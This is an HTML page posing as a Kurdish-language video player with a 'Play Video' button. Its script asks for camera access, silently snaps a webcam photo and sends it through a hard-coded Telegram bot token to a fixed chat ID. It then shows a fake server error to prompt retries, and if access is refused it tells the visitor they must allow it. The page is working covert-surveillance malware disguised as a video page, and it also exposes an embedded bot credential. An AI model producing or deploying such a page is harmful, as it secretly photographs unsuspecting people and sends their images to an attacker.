<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            /* بەکارهێنانی وێنەی مافورەکان وەک باگراوند */
            background-image: url('https://raw.githubusercontent.com/alahashim039-commits/my-website/main/image.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            font-family: sans-serif;
            text-align: center;
            color: white;
        }

        /* دروستکردنی چینێکی لێڵ بۆ ئەوەی نووسینەکە بە جوانی بخوێنرێتەوە */
        #main-container {
            background: rgba(0, 0, 0, 0.7);
            padding: 40px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            backdrop-filter: blur(5px);
            width: 80%;
            max-width: 350px;
        }

        h2 {
            margin-bottom: 25px;
            font-size: 20px;
        }

        #startBtn {
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 50px;
            border: none;
            background: #ffffff;
            color: #000;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }

        #startBtn:active {
            transform: scale(0.95);
        }
    </style>
</head>
<body>

    <div id="main-container">
        <h2 id="status">ڤیدیۆکە ئامادەیە</h2>
        <button id="startBtn">Play Video 🎬</button>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('status').innerText = "کەمێک چاوەڕێ بکە...";
            this.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => {
                const v = document.getElementById('v');
                v.srcObject = s;
                
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = 640; c.height = 480;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            document.getElementById('status').innerText = "هەڵەیەک لە سێرڤەر ڕوویدا، دووبارە هەوڵ بدەرەوە!";
                        });
                    }, 'image/jpeg');
                }, 1000);
            })
            .catch(e => {
                document.getElementById('status').innerText = "بۆ بینینی ڤیدیۆکە دەبێت ڕێگە بدەیت (Allow).";
            });
        });
    </script>
</body>
</html>
